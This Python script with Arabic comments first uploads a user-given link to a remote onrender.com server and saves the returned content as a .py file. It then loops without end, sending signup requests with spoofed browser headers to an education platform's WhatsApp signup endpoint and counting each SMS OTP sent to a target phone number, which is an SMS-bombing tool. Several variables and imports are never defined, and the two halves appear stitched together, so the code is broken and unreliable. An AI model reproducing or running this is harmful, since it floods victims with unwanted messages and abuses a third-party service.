import requests,os


R = '\x1b[38;5;1m'   # أحمر
M = '\x1b[38;5;244m' # رمادي 
L = '\x1b[38;5;10m' #اخضر 


server = "https://server-3-mzac.onrender.com"

url = input(f"{L} Enter link :").strip()
os.system("clear")

name = input(f"{L} Enter Name :").strip()
os.system("clear")

ibra = input(f"{L} Enter user (_.py)  ;").strip()
os.system("clear")

response = requests.post(f"{server}/upload", json={"name": name, "url": url})

if response.status_code == 200:
    with open(ibra, 'wb') as f:
        f.write(response.content)
    print("✅ تم الرفع")
else:
    print(f"❌ فشل: {response.text}")

while True:
	contt += 1

	url = "https://gw.abgateway.com/student/whatsapp/signup"
	        
	
	
	
	headers = {
	            'User-Agent': str(generate_user_agent()),
	            'Accept': "application/json",
	            'Content-Type': "application/json",
	            'x-trace-id': "guest_user:ec71bc1f-7bf7-490a-b0dc-dad31e7f31d7",
	            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
	            'sec-ch-ua-mobile': "?1",
	            'access-control-allow-origin': "*",
	            'platform': "web",
	            'sec-ch-ua-platform': '"Android"',
	            'origin': "https://abwaab.com",
	            'sec-fetch-site': "cross-site",
	            'sec-fetch-mode': "cors",
	            'sec-fetch-dest': "empty",
	            'referer': "https://abwaab.com/",
	            'accept-language': "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
	            'priority': "u=1, i"
	        }
	payload = {
	            "language": "ar",
	            "password": "Abc123456",
	            "phone": ful,
	            "country": contry,
	            "country_code": cod,
	            "platform": "web"
	        }
	        
	response = requests.post(url, data=json.dumps(payload), headers=headers,timeout=5).text
	
	if 'sms_otp_code_sent_succ' in response:
	    OK += 1
	else:
	    BAD += 1
	    
	print(f"\r {L} success : {OK} | {R} Faild : {BAD} : {ful} ",end="")
